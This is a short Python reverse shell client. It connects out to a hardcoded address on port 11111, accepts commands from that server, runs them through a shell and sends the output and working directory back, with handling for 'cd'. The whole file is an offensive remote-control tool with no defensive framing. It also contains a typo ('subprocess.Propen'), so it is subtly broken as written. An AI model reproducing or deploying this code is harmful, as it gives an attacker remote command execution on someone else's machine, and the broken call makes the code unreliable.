import os
import socket
import subprocess

sc = socket.socket()
host = '192.168.66.1'
#IP address of my server
port = 11111
sc.connect((host,port))

while True:
    data = sc.recv(1024)
    if data[:2].decode("utf-8") == 'cd' :
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd_Input = subprocess.Propen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        #shell=True, #only if you want the client to know whats gpoing on
        output_byte = cmd_Input.stdout.read() + cmd_Input.stderr.read()
        output_str = str(output_byte, "utf-8")
        sc.send(str.encode(output_str + os.getcwd() + '>'))
        print(output_str)   #only if you want the client to know whats gpoing on




